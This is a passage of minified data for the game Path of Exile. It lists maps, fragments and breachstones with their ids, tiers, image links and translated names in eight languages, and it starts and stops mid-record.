Map",language:{code:"th"}}],region:3},{id:460,tier:16,tiers:[16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Chimera.png?scale=1&mn=11&mt=",names:[{name:"Pit of the Chimera Map",language:{code:"en"}},{name:"Fosse de la Chimère, Carte",language:{code:"fr"}},{name:"'Grube der Chimäre'-Karte",language:{code:"de"}},{name:"키메라의 구덩이 지도(Pit of the Chimera Map)",language:{code:"ko"}},{name:"Mapa: Fosso da Quimera",language:{code:"pt"}},{name:"Карта ямы Химеры",language:{code:"ru"}},{name:"Mapa de Hoyo de la Quimera",language:{code:"es"}},{name:"Pit of the Chimera Map",language:{code:"th"}}],region:-1},{id:757,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Labyrinth.png",names:[{name:"Offering to the Goddess",language:{code:"en"}},{name:"Offrande à la déesse",language:{code:"fr"}},{name:"Opfergabe an die Göttin",language:{code:"de"}},{name:"여신에게 바치는 공물",language:{code:"ko"}},{name:"Oferenda à Deusa",language:{code:"pt"}},{name:"Подношение богине",language:{code:"ru"}},{name:"Ofrenda a la Diosa",language:{code:"es"}},{name:"Offering to the Goddess",language:{code:"th"}}],region:-1},{id:465,tier:16,tiers:[0,0,0,0,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/VaalTempleBase.png?scale=1&mn=11&mt=",names:[{name:"Vaal Temple Map",language:{code:"en"}},{name:"Temple vaal, Carte",language:{code:"fr"}},{name:"'Vaal-Tempel'-Karte",language:{code:"de"}},{name:"바알 사원 지도(Vaal Temple Map)",language:{code:"ko"}},{name:"Mapa: Templo Vaal",language:{code:"pt"}},{name:"Карта храма ваал",language:{code:"ru"}},{name:"Mapa de Templo Vaal",language:{code:"es"}},{name:"Vaal Temple Map",language:{code:"th"}}],region:2},{id:407,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Arena.png?scale=1&mn=11&mt=",names:[{name:"Arena Map",language:{code:"en"}},{name:"Arène, Carte",language:{code:"fr"}},{name:"'Arena'-Karte",language:{code:"de"}},{name:"투기장 지도(Arena Map)",language:{code:"ko"}},{name:"Mapa: Arena",language:{code:"pt"}},{name:"Карта арены",language:{code:"ru"}},{name:"Mapa de Arena",language:{code:"es"}},{name:"Arena Map",language:{code:"th"}}],region:6},{id:446,tier:7,tiers:[0,7,12,14,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Oasis.png?scale=1&mn=11&mt=",names:[{name:"Desert Spring Map",language:{code:"en"}},{name:"Source du désert, Carte",language:{code:"fr"}},{name:"'Wüstenquell'-Karte",language:{code:"de"}},{name:"사막의 샘 지도(Desert Spring Map)",language:{code:"ko"}},{name:"Mapa: Fonte do Deserto",language:{code:"pt"}},{name:"Карта пустынного источника",language:{code:"ru"}},{name:"Mapa de Manantial de Desierto",language:{code:"es"}},{name:"Desert Spring Map",language:{code:"th"}}],region:0},{id:748,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/EshsPureBreachstone.png",names:[{name:"Esh's Pure Breachstone",language:{code:"en"}},{name:"Pierre de Brèche pure d'Esh",language:{code:"fr"}},{name:"Eshs purer Riss-Stein",language:{code:"de"}},{name:"에쉬의 순수한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Pura de Esh",language:{code:"pt"}},{name:"Очищенный камень Разлома Иш",language:{code:"ru"}},{name:"Piedra de Fisura Pura de Esh",language:{code:"es"}},{name:"Esh's Pure Breachstone",language:{code:"th"}}],region:-1},{id:451,tier:5,tiers:[5,9,12,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Sanctuary.png?scale=1&mn=11&mt=",names:[{name:"Crimson Temple Map",language:{code:"en"}},{name:"Temple écarlate, Carte",language:{code:"fr"}},{name:"'Bluttempel'-Karte",language:{code:"de"}},{name:"진홍색 사원 지도(Crimson Temple Map)",language:{code:"ko"}},{name:"Mapa: Templo Carmesim",language:{code:"pt"}},{name:"Карта кровавого храма",language:{code:"ru"}},{name:"Mapa de Templo Carmesí",language:{code:"es"}},{name:"Crimson Temple Map",language:{code:"th"}}],region:7},{id:734,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsPhysical.png",names:[{name:"Uul-Netol's Breachstone",language:{code:"en"}},{name:"Pierre de Brèche d'Uul-Netol",language:{code:"fr"}},{name:"Uul-Netols Riss-Stein",language:{code:"de"}},{name:"울네톨의 균열석",language:{code:"ko"}},{name:"Pedra da Fenda de Uul-Netol",language:{code:"pt"}},{name:"Камень Разлома Уул-Нетол",language:{code:"ru"}},{name:"Piedra de Fisura de Uul-Netol",language:{code:"es"}},{name:"Uul-Netol's Breachstone",language:{code:"th"}}],region:-1},{id:730,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/SinFlaskEmpty.png",names:[{name:"Divine Vessel",language:{code:"en"}},{name:"Réceptacle divin",language:{code:"fr"}},{name:"Göttliches Gefäß",language:{code:"de"}},{name:"성스러운 시험관",language:{code:"ko"}},{name:"Recipiente Divino",language:{code:"pt"}},{name:"Божественный сосуд",language:{code:"ru"}},{name:"Recipiente Divino",language:{code:"es"}},{name:"Divine Vessel",language:{code:"th"}}],region:-1},{id:433,tier:9,tiers:[0,0,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/CastleRuins.png?scale=1&mn=11&mt=",names:[{name:"Castle Ruins Map",language:{code:"en"}},{name:"Château en ruines, Carte",language:{code:"fr"}},{name:"'Burgruinen'-Karte",language:{code:"de"}},{name:"성곽 유적 지도(Castle Ruins Map)",language:{code:"ko"}},{name:"Mapa: Ruínas do Castelo",language:{code:"pt"}},{name:"Карта развалин замка",language:{code:"ru"}},{name:"Mapa de Ruinas del Castillo",language:{code:"es"}},{name:"Castle Ruins Map",language:{code:"th"}}],region:5},{id:728,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberElder04.png",names:[{name:"Fragment of Knowledge",language:{code:"en"}},{name:"Fragment de la Connaissance",language:{code:"fr"}},{name:"Fragment des Wissens",language:{code:"de"}},{name:"지식의 조각",language:{code:"ko"}},{name:"Fragmento do Conhecimento",language:{code:"pt"}},{name:"Фрагмент знания",language:{code:"ru"}},{name:"Fragmento de conocimiento",language:{code:"es"}},{name:"Fragment of Knowledge",language:{code:"th"}}],region:-1},{id:416,tier:3,tiers:[3,7,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Bog.png?scale=1&mn=11&mt=",names:[{name:"Bog Map",language:{code:"en"}},{name:"Tourbière, Carte",language:{code:"fr"}},{name:"'Sumpf'-Karte",language:{code:"de"}},{name:"습지대 지도(Bog Map)",language:{code:"ko"}},{name:"Mapa: Brejo",language:{code:"pt"}},{name:"Карта трясины",language:{code:"ru"}},{name:"Mapa de Ciénaga",language:{code:"es"}},{name:"Bog Map",language:{code:"th"}}],region:2},{id:610,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UniqueMapEye.png",names:[{name:"Whakawairua Tuahu",language:{code:"en"}},{name:"Whakawairua Tuahu",language:{code:"fr"}},{name:"Whakawairua Tuahu",language:{code:"de"}},{name:"와카와 투아후(Whakawairua Tuahu)",language:{code:"ko"}},{name:"Whakawairua Tuahu",language:{code:"pt"}},{name:"Вакаваируа Туаху",language:{code:"ru"}},{name:"Whakawairua Tuahu",language:{code:"es"}},{name:"Whakawairua Tuahu",language:{code:"th"}}],region:-1},{id:626,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/SynthesisGolemGuardianMap.png",names:[{name:"Rewritten Distant Memory",language:{code:"en"}},{name:"Souvenir lointain réécrit",language:{code:"fr"}},{name:"Umgeschriebene entfernte Erinnerung",language:{code:"de"}},{name:"다시 쓰인 희미한 기억(Rewritten Distant Memory)",language:{code:"ko"}},{name:"Memória Distante Reescrita",language:{code:"pt"}},{name:"Переписанное отдалённое воспоминание",language:{code:"ru"}},{name:"Memoria Lejana Reescrita",language:{code:"es"}},{name:"ความทรงจำที่ห่างไกลที่ถูกเขียนใหม่",language:{code:"th"}}],region:-1},{id:759,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/LabyrinthHarvestInfused1.png",names:[{name:"Gift to the Goddess",language:{code:"en"}},{name:"Présent à la déesse",language:{code:"fr"}},{name:"Geschenk an die Göttin",language:{code:"de"}},{name:"여신에게 바치는 선물",language:{code:"ko"}},{name:"Presente à Deusa",language:{code:"pt"}},{name:"Дар богине",language:{code:"ru"}},{name:"Regalo a la Diosa",language:{code:"es"}},{name:"Gift to the Goddess",language:{code:"th"}}],region:-1},{id:424,tier:5,tiers:[5,8,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/SpiderForest.png?scale=1&mn=11&mt=",names:[{name:"Spider Forest Map",language:{code:"en"}},{name:"Forêt aux araignées, Carte",language:{code:"fr"}},{name:"'Spinnenwald'-Karte",language:{code:"de"}},{name:"거미 숲 지도(Spider Forest Map)",language:{code:"ko"}},{name:"Mapa: Floresta da Aranha",language:{code:"pt"}},{name:"Карта паучьего леса",language:{code:"ru"}},{name:"Mapa de Bosque de Arañas",language:{code:"es"}},{name:"Spider Forest Map",language:{code:"th"}}],region:3},{id:850,tier:9,tiers:[0,9,12,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Burn.png?scale=1&mn=11&mt=",names:[{name:"Grave Trough Map",language:{code:"en"}},{name:"Grave Trough Map",language:{code:"fr"}},{name:"Grave Trough Map",language:{code:"de"}},{name:"Grave Trough Map",language:{code:"ko"}},{name:"Grave Trough Map",language:{code:"pt"}},{name:"Grave Trough Map",language:{code:"ru"}},{name:"Grave Trough Map",language:{code:"es"}},{name:"Grave Trough Map",language:{code:"th"}}],region:4},{id:459,tier:6,tiers:[0,6,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Carcass.png?scale=1&mn=11&mt=",names:[{name:"Carcass Map",language:{code:"en"}},{name:"Carcasse, Carte",language:{code:"fr"}},{name:"'Kadaver'-Karte",language:{code:"de"}},{name:"시체 지도(Carcass Map)",language:{code:"ko"}},{name:"Mapa: Carcaça",language:{code:"pt"}},{name:"Карта остова",language:{code:"ru"}},{name:"Mapa de Cadáver",language:{code:"es"}},{name:"Carcass Map",language:{code:"th"}}],region:5},{id:348,tier:4,tiers:[4,8,12,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Courthouse.png?scale=1&mn=11&mt=",names:[{name:"Courthouse Map",language:{code:"en"}},{name:"Prétoire, Carte",language:{code:"fr"}},{name:"'Gericht'-Karte",language:{code:"de"}},{name:"법원 지도(Courthouse Map)",language:{code:"ko"}},{name:"Mapa: Corte",language:{code:"pt"}},{name:"Карта здания суда",language:{code:"ru"}},{name:"Mapa de Juzgado",language:{code:"es"}},{name:"Courthouse Map",language:{code:"th"}}],region:5},{id:853,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/ColdRiver.png?scale=1&mn=11&mt=",names:[{name:"Cold River Map",language:{code:"en"}},{name:"Cold River Map",language:{code:"fr"}},{name:"Cold River Map",language:{code:"de"}},{name:"Cold River Map",language:{code:"ko"}},{name:"Cold River Map",language:{code:"pt"}},{name:"Cold River Map",language:{code:"ru"}},{name:"Cold River Map",language:{code:"es"}},{name:"Cold River Map",language:{code:"th"}}],region:1},{id:403,tier:9,tiers:[0,9,12,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Plateau.png?scale=1&mn=11&mt=",names:[{name:"Plateau Map",language:{code:"en"}},{name:"Plateau, Carte",language:{code:"fr"}},{name:"'Plateau'-Karte",language:{code:"de"}},{name:"고원 지도(Plateau Map)",language:{code:"ko"}},{name:"Mapa: Planalto",language:{code:"pt"}},{name:"Карта плоскогорья",language:{code:"ru"}},{name:"Mapa de Meseta",language:{code:"es"}},{name:"Plateau Map",language:{code:"th"}}],region:7},{id:701,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Vaal02.png",names:[{name:"Sacrifice at Dawn",language:{code:"en"}},{name:"Sacrifice à l'aube",language:{code:"fr"}},{name:"Opfergabe bei Morgendämmerung",language:{code:"de"}},{name:"새벽의 희생",language:{code:"ko"}},{name:"Sacrifício ao Amanhecer",language:{code:"pt"}},{name:"Жертва на рассвете",language:{code:"ru"}},{name:"Sacrificio al Amanecer",language:{code:"es"}},{name:"Sacrifice at Dawn",language:{code:"th"}}],region:-1},{id:727,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberElder03.png",names:[{name:"Fragment of Shape",language:{code:"en"}},{name:"Fragment du Façonnement",language:{code:"fr"}},{name:"Fragment der Schöpfung",language:{code:"de"}},{name:"형성의 조각",language:{code:"ko"}},{name:"Fragmento de Forma",language:{code:"pt"}},{name:"Фрагмент формы",language:{code:"ru"}},{name:"Fragmento de forma",language:{code:"es"}},{name:"Fragment of Shape",language:{code:"th"}}],region:-1},{id:367,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Fields.png?scale=1&mn=11&mt=",names:[{name:"Fields Map",language:{code:"en"}},{name:"Champs, Carte",language:{code:"fr"}},{name:"'Flachland'-Karte",language:{code:"de"}},{name:"들판 지도(Fields Map)",language:{code:"ko"}},{name:"Mapa: Campos",language:{code:"pt"}},{name:"Карта полей",language:{code:"ru"}},{name:"Mapa de Campos",language:{code:"es"}},{name:"Fields Map",language:{code:"th"}}],region:5},{id:417,tier:14,tiers:[0,0,0,0,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Pier.png?scale=1&mn=11&mt=",names:[{name:"Pier Map",language:{code:"en"}},{name:"Jetée, Carte",language:{code:"fr"}},{name:"'Pier'-Karte",language:{code:"de"}},{name:"선창 지도(Pier Map)",language:{code:"ko"}},{name:"Mapa: Píer",language:{code:"pt"}},{name:"Карта причала",language:{code:"ru"}},{name:"Mapa de Muelle",language:{code:"es"}},{name:"Pier Map",language:{code:"th"}}],region:3},{id:337,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Cage.png?scale=1&mn=11&mt=",names:[{name:"Cage Map",language:{code:"en"}},{name:"Cage, Carte",language:{code:"fr"}},{name:"'Käfig'-Karte",language:{code:"de"}},{name:"창살 지도(Cage Map)",language:{code:"ko"}},{name:"Mapa: Jaula",language:{code:"pt"}},{name:"Карта клетки",language:{code:"ru"}},{name:"Mapa de Jaula",language:{code:"es"}},{name:"Cage Map",language:{code:"th"}}],region:2},{id:717,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMaps/FragmentChimera.png",names:[{name:"Fragment of the Chimera",language:{code:"en"}},{name:"Fragment de la Chimère",language:{code:"fr"}},{name:"Fragment der Chimäre",language:{code:"de"}},{name:"키메라의 지도 조각",language:{code:"ko"}},{name:"Fragmento da Quimera",language:{code:"pt"}},{name:"Фрагмент Химеры",language:{code:"ru"}},{name:"Fragmento de la Quimera",language:{code:"es"}},{name:"Fragment of the Chimera",language:{code:"th"}}],region:-1},{id:338,tier:4,tiers:[4,7,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/FungalCaverns.png?scale=1&mn=11&mt=",names:[{name:"Fungal Hollow Map",language:{code:"en"}},{name:"Gouffre fongique, Carte",language:{code:"fr"}},{name:"'Pilzbewachsene Höhle'-Karte",language:{code:"de"}},{name:"곰팡이 동혈 지도(Fungal Hollow Map)",language:{code:"ko"}},{name:"Mapa: Oco Fúngico",language:{code:"pt"}},{name:"Карта грибковой впадины",language:{code:"ru"}},{name:"Mapa de Hondonada Fúngica",language:{code:"es"}},{name:"Fungal Hollow Map",language:{code:"th"}}],region:3},{id:423,tier:11,tiers:[0,0,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/PrimordialPool.png?scale=1&mn=11&mt=",names:[{name:"Primordial Pool Map",language:{code:"en"}},{name:"Bassin primordial, Carte",language:{code:"fr"}},{name:"'Urbecken'-Karte",language:{code:"de"}},{name:"태고의 웅덩이 지도(Primordial Pool Map)",language:{code:"ko"}},{name:"Mapa: Lamaçal Primordial",language:{code:"pt"}},{name:"Карта древнего озера",language:{code:"ru"}},{name:"Mapa de Charca Primordial",language:{code:"es"}},{name:"Primordial Pool Map",language:{code:"th"}}],region:0},{id:605,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/FairgravesMap01.png",names:[{name:"Mao Kun",language:{code:"en"}},{name:"Mao Kun",language:{code:"fr"}},{name:"Mao Kun",language:{code:"de"}},{name:"마오 쿤(Mao Kun)",language:{code:"ko"}},{name:"Mao Kun",language:{code:"pt"}},{name:"Мао Кун",language:{code:"ru"}},{name:"Mao Kun",language:{code:"es"}},{name:"Mao Kun",language:{code:"th"}}],region:-1},{id:616,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/HallowedGround.png",names:[{name:"Hallowed Ground",language:{code:"en"}},{name:"Terreurs nocturnes",language:{code:"fr"}},{name:"Nacht des Grauens",language:{code:"de"}},{name:"거룩한 대지(Hallowed Ground)",language:{code:"ko"}},{name:"Terras Sagradas",language:{code:"pt"}},{name:"Священная земля",language:{code:"ru"}},{name:"Una Noche de Terror",language:{code:"es"}},{name:"Hallowed Ground",language:{code:"th"}}],region:-1},{id:427,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Factory.png?scale=1&mn=11&mt=",names:[{name:"Factory Map",language:{code:"en"}},{name:"Fabrique, Carte",language:{code:"fr"}},{name:"'Manufaktur'-Karte",language:{code:"de"}},{name:"공장 지도(Factory Map)",language:{code:"ko"}},{name:"Mapa: Fábrica",language:{code:"pt"}},{name:"Карта фактории",language:{code:"ru"}},{name:"Mapa de Fábrica",language:{code:"es"}},{name:"Factory Map",language:{code:"th"}}],region:0},{id:448,tier:14,tiers:[0,0,0,0,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Colosseum.png?scale=1&mn=11&mt=",names:[{name:"Colosseum Map",language:{code:"en"}},{name:"Colisée, Carte",language:{code:"fr"}},{name:"'Kolosseum'-Karte",language:{code:"de"}},{name:"원형 경기장 지도(Colosseum Map)",language:{code:"ko"}},{name:"Mapa: Coliseu",language:{code:"pt"}},{name:"Карта колизея",language:{code:"ru"}},{name:"Mapa de Coliseo",language:{code:"es"}},{name:"Colosseum Map",language:{code:"th"}}],region:5},{id:740,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/ChayulasChargedBreachstone.png",names:[{name:"Chayula's Charged Breachstone",language:{code:"en"}},{name:"Pierre de Brèche chargée de Chayula",language:{code:"fr"}},{name:"Chayulas geladener Riss-Stein",language:{code:"de"}},{name:"차율라의 충전된 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Energizada de Chayula",language:{code:"pt"}},{name:"Заряженный камень Разлома Чаюлы",language:{code:"ru"}},{name:"Piedra de Fisura Cargada de Chayula",language:{code:"es"}},{name:"Chayula's Charged Breachstone",language:{code:"th"}}],region:-1},{id:430,tier:3,tiers:[3,6,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/DefiledCathedral.png?scale=1&mn=11&mt=",names:[{name:"Defiled Cathedral Map",language:{code:"en"}},{name:"Cathédrale profanée, Carte",language:{code:"fr"}},{name:"'Entweihte Kathedrale'-Karte",language:{code:"de"}},{name:"더럽혀진 대성당 지도(Defiled Cathedral Map)",language:{code:"ko"}},{name:"Mapa: Catedral Profanada",language:{code:"pt"}},{name:"Карта осквернённого собора",language:{code:"ru"}},{name:"Mapa de Catedral Profanada",language:{code:"es"}},{name:"Defiled Cathedral Map",language:{code:"th"}}],region:0},{id:326,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Lookout.png?scale=1&mn=11&mt=",names:[{name:"Lookout Map",language:{code:"en"}},{name:"Belvédère, Carte",language:{code:"fr"}},{name:"'Ausguck'-Karte",language:{code:"de"}},{name:"전망대 지도(Lookout Map)",language:{code:"ko"}},{name:"Mapa: Posto de Vigia",language:{code:"pt"}},{name:"Карта обзорной площадки",language:{code:"ru"}},{name:"Mapa de Puesto de Observación",language:{code:"es"}},{name:"Lookout Map",language:{code:"th"}}],region:1},{id:380,tier:14,tiers:[0,0,0,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Residence.png?scale=1&mn=11&mt=",names:[{name:"Residence Map",language:{code:"en"}},{name:"Résidence, Carte",language:{code:"fr"}},{name:"'Residenz'-Karte",language:{code:"de"}},{name:"주택 지도(Residence Map)",language:{code:"ko"}},{name:"Mapa: Residência",language:{code:"pt"}},{name:"Карта резиденции",language:{code:"ru"}},{name:"Mapa de Residencia",language:{code:"es"}},{name:"Residence Map",language:{code:"th"}}],region:4},{id:714,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourtComplete.png",names:[{name:"Pale Court Set",language:{code:"en"}},{name:"Ensemble de la Cour pâle",language:{code:"fr"}},{name:"Das bleiche Gericht",language:{code:"de"}},{name:"창백한 궁정 세트",language:{code:"ko"}},{name:"Conjunto da Corte Pálida",language:{code:"pt"}},{name:"Набор Бледного суда",language:{code:"ru"}},{name:"Set de la Corte Pálida",language:{code:"es"}},{name:"Pale Court Set",language:{code:"th"}}],region:-1},{id:725,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberElder01.png",names:[{name:"Fragment of Terror",language:{code:"en"}},{name:"Fragment de la Terreur",language:{code:"fr"}},{name:"Fragment des Schreckens",language:{code:"de"}},{name:"공포의 조각",language:{code:"ko"}},{name:"Fragmento do Terror",language:{code:"pt"}},{name:"Фрагмент ужаса",language:{code:"ru"}},{name:"Fragmento de terror",language:{code:"es"}},{name:"Fragment of Terror",language:{code:"th"}}],region:-1},{id:628,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/HarbingerUber.png",names:[{name:"Infused Beachhead",language:{code:"en"}},{name:"La Tête de pont infusée",language:{code:"fr"}},{name:"Verstärkter Brückenkopf",language:{code:"de"}},{name:"주입된 교두보(Infused Beachhead)",language:{code:"ko"}},{name:"Cabeça da Ponte Infundida",language:{code:"pt"}},{name:"Усиленный Плацдарм",language:{code:"ru"}},{name:"La Cabecera de la playa infundida",language:{code:"es"}},{name:"Infused Beachhead",language:{code:"th"}}],region:-1},{id:359,tier:3,tiers:[3,7,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Maze.png?scale=1&mn=11&mt=",names:[{name:"Maze Map",language:{code:"en"}},{name:"Dédale, Carte",language:{code:"fr"}},{name:"'Irrgarten'-Karte",language:{code:"de"}},{name:"미로 지도(Maze Map)",language:{code:"ko"}},{name:"Mapa: Dédalo",language:{code:"pt"}},{name:"Карта лабиринта",language:{code:"ru"}},{name:"Mapa de Laberinto",language:{code:"es"}},{name:"Maze Map",language:{code:"th"}}],region:2},{id:612,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/TheVinktarSquare.png",names:[{name:"The Vinktar Square",language:{code:"en"}},{name:"La Place de Vinktar",language:{code:"fr"}},{name:"Der Vinktar-Platz",language:{code:"de"}},{name:"빙타 광장(The Vinktar Square)",language:{code:"ko"}},{name:"A Praça Vinktar",language:{code:"pt"}},{name:"Площадь Винктара",language:{code:"ru"}},{name:"La Plaza de Vinktar",language:{code:"es"}},{name:"The Vinktar Square",language:{code:"th"}}],region:-1},{id:742,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/TulsEnrichedBreachstone.png",names:[{name:"Tul's Enriched Breachstone",language:{code:"en"}},{name:"Pierre de Brèche enrichie de Tul",language:{code:"fr"}},{name:"Tuls angereicherter Riss-Stein",language:{code:"de"}},{name:"툴의 풍부한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Enriquecida de Tul",language:{code:"pt"}},{name:"Обогащённый камень Разлома Тул",language:{code:"ru"}},{name:"Piedra de Fisura Enriquecida de Tul",language:{code:"es"}},{name:"Tul's Enriched Breachstone",language:{code:"th"}}],region:-1},{id:353,tier:5,tiers:[0,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Volcano.png?scale=1&mn=11&mt=",names:[{name:"Volcano Map",language:{code:"en"}},{name:"Volcan, Carte",language:{code:"fr"}},{name:"'Vulkan'-Karte",language:{code:"de"}},{name:"화산 지도(Volcano Map)",language:{code:"ko"}},{name:"Mapa: Vulcão",language:{code:"pt"}},{name:"Карта вулкана",language:{code:"ru"}},{name:"Mapa de Volcán",language:{code:"es"}},{name:"Volcano Map",language:{code:"th"}}],region:5},{id:712,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourt03.png",names:[{name:"Inya's Key",language:{code:"en"}},{name:"Clé d'Inya",language:{code:"fr"}},{name:"Inyas Schlüssel",language:{code:"de"}},{name:"이냐의 열쇠",language:{code:"ko"}},{name:"Chave de Inya",language:{code:"pt"}},{name:"Ключ Иньи",language:{code:"ru"}},{name:"Llave de Inya",language:{code:"es"}},{name:"Inya's Key",language:{code:"th"}}],region:-1},{id:341,tier:4,tiers:[4,7,11,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/DryPeninsula.png?scale=1&mn=11&mt=",names:[{name:"Peninsula Map",language:{code:"en"}},{name:"Péninsule, Carte",language:{code:"fr"}},{name:"'Halbinsel'-Karte",language:{code:"de"}},{name:"반도 지도(Peninsula Map)",language:{code:"ko"}},{name:"Mapa: Península",language:{code:"pt"}},{name:"Карта мыса",language:{code:"ru"}},{name:"Mapa de Península",language:{code:"es"}},{name:"Peninsula Map",language:{code:"th"}}],region:5},{id:439,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Abyss.png?scale=1&mn=11&mt=",names:[{name:"Caldera Map",language:{code:"en"}},{name:"Caldeira, Carte",language:{code:"fr"}},{name:"'Caldera'-Karte",language:{code:"de"}},{name:"칼데라 지도(Caldera Map)",language:{code:"ko"}},{name:"Mapa: Caldeira Vulcânica",language:{code:"pt"}},{name:"Карта кальдеры",language:{code:"ru"}},{name:"Mapa de Caldera",language:{code:"es"}},{name:"Caldera Map",language:{code:"th"}}],region:5},{id:604,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PoorjoysAsylum.png",names:[{name:"Poorjoy's Asylum",language:{code:"en"}},{name:"L'Asile de Poorjoy",language:{code:"fr"}},{name:"PoorJoys Zuflucht",language:{code:"de"}},{name:"푸어조이의 은신처(Poorjoy's Asylum)",language:{code:"ko"}},{name:"Asilo de Poorjoy",language:{code:"pt"}},{name:"Богадельня Паршута",language:{code:"ru"}},{name:"Asilo de PoorJoy",language:{code:"es"}},{name:"Poorjoy's Asylum",language:{code:"th"}}],region:-1},{id:739,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/UulNetolsChargedBreachstone.png",names:[{name:"Uul-Netol's Charged Breachstone",language:{code:"en"}},{name:"Pierre de Brèche chargée d'Uul-Netol",language:{code:"fr"}},{name:"Uul-Netols geladener Riss-Stein",language:{code:"de"}},{name:"울네톨의 충전된 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Energizada de Uul-Netol",language:{code:"pt"}},{name:"Заряженный камень Разлома Уул-Нетол",language:{code:"ru"}},{name:"Piedra de Fisura Cargada de Uul-Netol",language:{code:"es"}},{name:"Uul-Netol's Charged Breachstone",language:{code:"th"}}],region:-1},{id:385,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Terrace.png?scale=1&mn=11&mt=",names:[{name:"Gardens Map",language:{code:"en"}},{name:"Jardins, Carte",language:{code:"fr"}},{name:"'Gärten'-Karte",language:{code:"de"}},{name:"정원 지도(Gardens Map)",language:{code:"ko"}},{name:"Mapa: Jardins",language:{code:"pt"}},{name:"Карта садов",language:{code:"ru"}},{name:"Mapa de Jardines",language:{code:"es"}},{name:"Gardens Map",language:{code:"th"}}],region:7},{id:856,tier:3,tiers:[3,7,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/FrozenCabins.png?scale=1&mn=11&mt=",names:[{name:"Frozen Cabins Map",language:{code:"en"}},{name:"Frozen Cabins Map",language:{code:"fr"}},{name:"Frozen Cabins Map",language:{code:"de"}},{name:"Frozen Cabins Map",language:{code:"ko"}},{name:"Frozen Cabins Map",language:{code:"pt"}},{name:"Frozen Cabins Map",language:{code:"ru"}},{name:"Frozen Cabins Map",language:{code:"es"}},{name:"Frozen Cabins Map",language:{code:"th"}}],region:2},{id:718,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMaps/FragmentHydra.png",names:[{name:"Fragment of the Hydra",language:{code:"en"}},{name:"Fragment de l'Hydre",language:{code:"fr"}},{name:"Fragment der Hydra",language:{code:"de"}},{name:"히드라의 지도 조각",language:{code:"ko"}},{name:"Fragmento da 